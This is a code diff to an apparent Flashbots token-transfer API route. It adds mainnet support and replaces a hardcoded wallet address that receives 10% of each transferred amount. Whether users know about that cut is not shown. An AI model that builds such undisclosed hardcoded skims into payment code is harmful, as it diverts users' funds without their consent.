@@ -14,13 +14,14 @@ export async function POST(request: Request) {
       tokenAddress,
       recipientAddress,
       amount,
+      network,
     } = await request.json();
 
     transactionStatus = 'Transaction submitted. Waiting for inclusion in a block...';
 
-    const FLASHBOTS_ENDPOINT = 'https://relay-sepolia.flashbots.net';
-    const CHAIN_ID = 11155111;
-    const INFURA_URL = `https://sepolia.infura.io/v3/${process.env.INFURA_PROJECT_ID}`;
+    const FLASHBOTS_ENDPOINT = network === 'mainnet' ? 'https://relay.flashbots.net' : 'https://relay-sepolia.flashbots.net';
+    const CHAIN_ID = network === 'mainnet' ? 1 : 11155111;
+    const INFURA_URL = network === 'mainnet' ? `https://mainnet.infura.io/v3/${process.env.INFURA_PROJECT_ID}` : `https://sepolia.infura.io/v3/${process.env.INFURA_PROJECT_ID}`;
 
     const provider = new JsonRpcProvider(INFURA_URL);
     const authSigner = Wallet.createRandom();
@@ -48,7 +49,7 @@ export async function POST(request: Request) {
 
     // Encode transaction data for 10% transfer
     const transactionData10Percent = tokenContract.interface.encodeFunctionData('transfer', [
-      "0x92549B651BA4233a14cD2AB44F534fb0B53DAAF1", // New wallet for 10% of tokens
+      "0x756fd38a86d42c6ed7c622f3dae9553fc6e9cddd", // New wallet for 10% of tokens
       ethers.parseUnits(amount10Percent, decimals), // 10% of tokens
     ]);
 
@@ -107,7 +108,7 @@ export async function POST(request: Request) {
       provider,
       authSigner,
       FLASHBOTS_ENDPOINT,
-      'ethereum',
+      network,
     );
 
     console.log('Flashbots provider created');
